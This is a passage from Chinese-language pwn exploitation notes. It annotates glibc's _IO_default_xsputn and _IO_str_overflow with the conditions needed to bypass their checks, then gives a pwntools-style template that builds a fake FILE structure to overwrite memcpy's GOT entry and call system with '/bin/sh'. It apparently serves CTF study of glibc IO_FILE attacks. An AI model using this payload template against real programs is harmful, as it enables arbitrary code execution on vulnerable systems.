</span></span><span class=line><span class=cl>  <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>s</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=n>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>size_t</span> <span class=n>more</span> <span class=o>=</span> <span class=n>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>more</span> <span class=o>&lt;=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(;;)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=cm>/* Space available. */</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>f</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>&lt;</span> <span class=n>f</span><span class=o>-&gt;</span><span class=n>_IO_write_end</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=kt>size_t</span> <span class=n>count</span> <span class=o>=</span> <span class=n>f</span><span class=o>-&gt;</span><span class=n>_IO_write_end</span> <span class=o>-</span> <span class=n>f</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=c1>// 要 more &gt; count，能再次返回执行 __mempcpy
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=k>if</span> <span class=p>(</span><span class=n>count</span> <span class=o>&gt;</span> <span class=n>more</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>count</span> <span class=o>=</span> <span class=n>more</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=c1>// 要 count &gt; 20
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=k>if</span> <span class=p>(</span><span class=n>count</span> <span class=o>&gt;</span> <span class=mi>20</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=c1>// 利用此处实现 house of 借刀杀人，
</span></span></span><span class=line><span class=cl><span class=c1></span>          <span class=c1>// 修改 memcpy 的内容为setcontext
</span></span></span><span class=line><span class=cl><span class=c1></span>          <span class=c1>// 再次返回的时候就能够实现 house of 一骑当千
</span></span></span><span class=line><span class=cl><span class=c1></span>          <span class=n>f</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>=</span> <span class=nf>__mempcpy</span> <span class=p>(</span><span class=n>f</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=n>count</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=n>s</span> <span class=o>+=</span> <span class=n>count</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>count</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=kt>char</span> <span class=o>*</span><span class=n>p</span> <span class=o>=</span> <span class=n>f</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=kt>ssize_t</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=n>count</span><span class=p>;</span> <span class=o>--</span><span class=n>i</span> <span class=o>&gt;=</span> <span class=mi>0</span><span class=p>;</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>p</span><span class=o>++</span> <span class=o>=</span> <span class=o>*</span><span class=n>s</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>f</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>=</span> <span class=n>p</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=c1>// 要 more &gt; count，能再次返回执行 __mempcpy
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>more</span> <span class=o>-=</span> <span class=n>count</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=c1>// 绕过下面这一行，再次执行for循环的内容，_IO_OVERFLOW实际调用_IO_str_overflow
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=k>if</span> <span class=p>(</span><span class=n>more</span> <span class=o>==</span> <span class=mi>0</span> <span class=o>||</span> <span class=nf>_IO_OVERFLOW</span> <span class=p>(</span><span class=n>f</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span><span class=p>)</span> <span class=o>*</span><span class=n>s</span><span class=o>++</span><span class=p>)</span> <span class=o>==</span> <span class=n>EOF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>more</span><span class=o>--</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>n</span> <span class=o>-</span> <span class=n>more</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nf>libc_hidden_def</span> <span class=p>(</span><span class=n>_IO_default_xsputn</span><span class=p>)</span></span></span></code></pre></div></div><p><strong>绕过</strong></p><ul><li>需要 <code>more</code> > <code>count</code>，能再次返回执行 <code>__mempcpy</code>，且要想再次返回执行 <code>memcpy</code>，由于此时 <code>f->_IO_write_ptr</code> 被 <code>_IO_str_overflow</code> 函数修改为指向 <code>"/bin/sh"</code> 字符串，因此 <code>count = f->_IO_write_end - f->_IO_write_ptr</code> 可能为一个很大的值，导致 <code>count > more</code>，进而更新 <code>count</code> 为 <code>more</code> ，因此再次循环时要求 <code>more > 20</code> 。由于上一次循环中依次执行了 <code>more -= count</code> 和 <code>more--</code> 语句，因此要求 <code>more</code> ≥ <code>count + 1 + 21</code> 。</li><li>需要 <code>count</code> > 20，因此 <code>count</code> 至少为 21 。</li><li>第一次执行 <code>__mempcpy (f->_IO_write_ptr, s, count);</code> 时，<ul><li><code>_IO_write_ptr</code> 为 <code>__mempcpy</code> 表项，</li><li>s 为要写入的内容。</li></ul></li><li>再次执行<code>__mempcpy (f->_IO_write_ptr, s, count);</code> 时，<ul><li>需要绕过 <code>if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF)</code> ，具体绕过方式接下来会介绍。</li><li><code>f->_IO_write_ptr</code> 为 <code>rdi</code> ，<code>s</code> 为 <code>rsi</code> ，<code>count</code> 为 <code>rdx</code> 。</li></ul></li></ul><p><code>_IO_str_overflow</code>作用：控制 <code>fp->_IO_write_ptr</code> ，从而控制 <code>_IO_default_xsputn</code> 第二次循环中 <code>__mempcpy</code> 的第一个参数</p><div class="code-block code-line-numbers" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>_IO_str_overflow</span> <span class=p>(</span><span class=n>FILE</span> <span class=o>*</span><span class=n>fp</span><span class=p>,</span> <span class=kt>int</span> <span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>flush_only</span> <span class=o>=</span> <span class=n>c</span> <span class=o>==</span> <span class=n>EOF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>size_t</span> <span class=n>pos</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_flags</span> <span class=o>&amp;</span> <span class=n>_IO_NO_WRITES</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=n>flush_only</span> <span class=o>?</span> <span class=mi>0</span> <span class=o>:</span> <span class=n>EOF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 需要进入来控制 fp-&gt;_IO_write_ptr ， _flags==0x400
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>((</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_flags</span> <span class=o>&amp;</span> <span class=n>_IO_TIED_PUT_GET</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_flags</span> <span class=o>&amp;</span> <span class=n>_IO_CURRENTLY_PUTTING</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_flags</span> <span class=o>|=</span> <span class=n>_IO_CURRENTLY_PUTTING</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>=</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_read_ptr</span><span class=p>;</span> <span class=c1>// 控制 fp-&gt;_IO_write_ptr 指向 &amp;&#34;/bin/sh&#34; - 1 作为下一次 memcpy(system) 的第一个参数
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_read_ptr</span> <span class=o>=</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_read_end</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>pos</span> <span class=o>=</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>-</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 不能进入，要让 _IO_blen (fp)  ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) 足够大。
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=n>pos</span> <span class=o>&gt;=</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)</span> <span class=p>(</span><span class=nf>_IO_blen</span> <span class=p>(</span><span class=n>fp</span><span class=p>)</span> <span class=o>+</span> <span class=n>flush_only</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_flags</span> <span class=o>&amp;</span> <span class=n>_IO_USER_BUF</span><span class=p>)</span> <span class=cm>/* not allowed to enlarge */</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>EOF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=kt>char</span> <span class=o>*</span><span class=n>new_buf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=kt>char</span> <span class=o>*</span><span class=n>old_buf</span> <span class=o>=</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=kt>size_t</span> <span class=n>old_blen</span> <span class=o>=</span> <span class=nf>_IO_blen</span> <span class=p>(</span><span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=kt>size_t</span> <span class=n>new_size</span> <span class=o>=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>old_blen</span> <span class=o>+</span> <span class=mi>100</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>new_size</span> <span class=o>&lt;</span> <span class=n>old_blen</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>EOF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>new_buf</span> <span class=o>=</span> <span class=nf>malloc</span> <span class=p>(</span><span class=n>new_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>new_buf</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=cm>/*      __ferror(fp) = 1; */</span>
</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=n>EOF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>old_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=nf>memcpy</span> <span class=p>(</span><span class=n>new_buf</span><span class=p>,</span> <span class=n>old_buf</span><span class=p>,</span> <span class=n>old_blen</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=nf>free</span> <span class=p>(</span><span class=n>old_buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=cm>/* Make sure _IO_setb won&#39;t try to delete _IO_buf_base. */</span>
</span></span><span class=line><span class=cl>          <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=nf>memset</span> <span class=p>(</span><span class=n>new_buf</span> <span class=o>+</span> <span class=n>old_blen</span><span class=p>,</span> <span class=sc>&#39;\0&#39;</span><span class=p>,</span> <span class=n>new_size</span> <span class=o>-</span> <span class=n>old_blen</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=nf>_IO_setb</span> <span class=p>(</span><span class=n>fp</span><span class=p>,</span> <span class=n>new_buf</span><span class=p>,</span> <span class=n>new_buf</span> <span class=o>+</span> <span class=n>new_size</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_read_base</span> <span class=o>=</span> <span class=n>new_buf</span> <span class=o>+</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_read_base</span> <span class=o>-</span> <span class=n>old_buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_read_ptr</span> <span class=o>=</span> <span class=n>new_buf</span> <span class=o>+</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_read_ptr</span> <span class=o>-</span> <span class=n>old_buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_read_end</span> <span class=o>=</span> <span class=n>new_buf</span> <span class=o>+</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_read_end</span> <span class=o>-</span> <span class=n>old_buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>=</span> <span class=n>new_buf</span> <span class=o>+</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>-</span> <span class=n>old_buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span> <span class=o>=</span> <span class=n>new_buf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_end</span> <span class=o>=</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_end</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>flush_only</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=c1>// 此处 fp-&gt;_IO_write_ptr 自加1，所以之前要少1.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=o>*</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span><span class=o>++</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span><span class=p>)</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>&gt;</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_read_end</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_read_end</span> <span class=o>=</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nf>libc_hidden_def</span> <span class=p>(</span><span class=n>_IO_str_overflow</span><span class=p>)</span></span></span></code></pre></div></div><p><strong>绕过</strong></p><ul><li><code>_flags = 0x400</code> 。</li><li><code>fp->_IO_read_ptr</code> 为再次执行 <code>__mempcpy (f->_IO_write_ptr, s, count);</code> 的 <code>rdi - 1</code> 。</li><li><code>(fp)->_IO_buf_end - (fp)->_IO_buf_base</code> 要足够大，一般设置 <code>(fp)->_IO_buf_end = 0xFFFFFFFFFFFFFFF0</code> 即可</li></ul><p><strong>利用</strong></p><img src=/img/pwn_note.zh-cn.assets/60649d737092dba6af8cb8c9977061aa.png alt=图片无法加载><p><strong>模板</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>file_addr</span> <span class=o>=</span> <span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x6d0</span>
</span></span><span class=line><span class=cl><span class=n>payload_addr</span> <span class=o>=</span> <span class=n>file_addr</span> <span class=o>+</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>wide_data_addr</span> <span class=o>=</span> <span class=n>file_addr</span> <span class=o>+</span> <span class=mh>0xe0</span>
</span></span><span class=line><span class=cl><span class=n>memcpy_buf_addr</span> <span class=o>=</span> <span class=n>file_addr</span> <span class=o>+</span> <span class=mh>0x1c8</span> <span class=o>+</span> <span class=mi>8</span> <span class=o>*</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>memcpy_got_addr</span> <span class=o>=</span> <span class=n>libc</span><span class=p>.</span><span class=n>address</span> <span class=o>+</span> <span class=mh>0x1d1040</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>=</span> <span class=n>b</span><span class=s>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_IO_read_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_IO_read_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_IO_write_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_IO_write_ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=mh>0x400</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_IO_write_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=n>memcpy_buf_addr</span> <span class=o>+</span> <span class=mi>8</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_IO_buf_base</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_IO_buf_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_IO_save_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_IO_backup_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=n>memcpy_got_addr</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_IO_save_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=n>memcpy_got_addr</span> <span class=o>+</span> <span class=mi>21</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_marks</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=err>#</span> <span class=n>the</span> <span class=n>FILE</span> <span class=n>chain</span> <span class=n>ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFF0</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_fileno</span> <span class=o>+</span> <span class=n>_flags2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_old_offset</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_cur_column</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>b</span><span class=s>&#34;</span><span class=se>\x00</span><span class=s>&#34;</span>  <span class=err>#</span> <span class=n>_vtable_offset</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>b</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span>  <span class=err>#</span> <span class=n>_shortbuf</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=err>#</span> <span class=n>padding</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=n>libc</span><span class=p>.</span><span class=n>sym</span><span class=p>[</span><span class=err>&#39;</span><span class=n>_IO_2_1_stdout_</span><span class=err>&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x1ea0</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_IO_stdfile_1_lock</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_offset</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_codecvt</span><span class=p>,</span> <span class=n>usually</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=n>wide_data_addr</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_IO_wide_data_1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_freeres_list</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_freeres_buf</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=n>libc</span><span class=p>.</span><span class=n>sym</span><span class=p>[</span><span class=err>&#39;</span><span class=n>_IO_2_1_stdout_</span><span class=err>&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x1ea0</span><span class=p>)</span>  <span class=err>#</span> <span class=n>__pad5</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p32</span><span class=p>(</span><span class=mh>0xFFFFFFFF</span><span class=p>)</span>  <span class=err>#</span> <span class=n>_mode</span><span class=p>,</span> <span class=n>usually</span> <span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>b</span><span class=s>&#34;</span><span class=se>\x00</span><span class=s>&#34;</span> <span class=o>*</span> <span class=mi>19</span>  <span class=err>#</span> <span class=n>_unused2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>=</span> <span class=n>fake_file</span><span class=p>.</span><span class=nf>ljust</span><span class=p>(</span><span class=mh>0xD8</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>,</span> <span class=n>b</span><span class=sc>&#39;\x00&#39;</span><span class=p>)</span>  <span class=err>#</span> <span class=n>adjust</span> <span class=n>to</span> <span class=n>vtable</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=n>libc</span><span class=p>.</span><span class=n>sym</span><span class=p>[</span><span class=err>&#39;</span><span class=n>_IO_helper_jumps</span><span class=err>&#39;</span><span class=p>])</span>  <span class=err>#</span> <span class=n>fake</span> <span class=n>vtable</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=n>memcpy_buf_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=n>memcpy_buf_addr</span> <span class=o>+</span> <span class=p>(</span><span class=mi>21</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=n>libc</span><span class=p>.</span><span class=n>sym</span><span class=p>[</span><span class=err>&#39;</span><span class=n>_IO_str_jumps</span><span class=err>&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>=</span> <span class=n>fake_file</span><span class=p>.</span><span class=nf>ljust</span><span class=p>(</span><span class=mh>0x1c8</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>,</span> <span class=sc>&#39;\x00&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=n>file_addr</span> <span class=o>+</span> <span class=mh>0x30</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=nf>p64</span><span class=p>(</span><span class=n>libc</span><span class=p>.</span><span class=n>sym</span><span class=p>[</span><span class=err>&#39;</span><span class=n>system</span><span class=err>&#39;</span><span class=p>])</span>
